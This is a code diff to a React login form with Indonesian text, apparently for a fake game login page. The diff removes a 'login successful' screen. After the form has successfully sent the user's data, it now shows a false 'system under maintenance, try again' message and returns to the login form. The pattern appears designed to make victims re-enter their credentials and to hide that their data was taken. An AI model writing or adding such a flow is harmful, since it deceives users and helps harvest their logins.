@@ -153,7 +153,12 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
       setShowCustomLoading(false);
       
       if (success) {
-        setStep(3); // Show Success Modal
+        setAlertConfig({
+          isOpen: true,
+          message: "Sistem sedang maintenance.",
+          subMessage: "Silakan coba login kembali."
+        });
+        setStep(1); // Kembali ke form login
       } else {
         alert('Gagal mengirim data. Silakan coba lagi.');
         setStep(1); // Kembali ke form login
@@ -553,19 +558,6 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
               </div>
             </div>
           </div>
-        </div>
-      )}
-
-      {/* ================= STEP 3: SUCCESS MODAL ================= */}
-      {step === 3 && (
-        <div className="flex flex-col items-center justify-center p-8 bg-white rounded-3xl shadow-xl animate-pop-in">
-           <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
-             <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
-             </svg>
-           </div>
-           <h2 className="text-2xl font-black text-gray-800 mb-2 uppercase tracking-tight">Login Berhasil!</h2>
-           <p className="text-gray-500 text-center font-medium">Anda akan segera diarahkan ke lobby game.</p>
         </div>
       )}
 
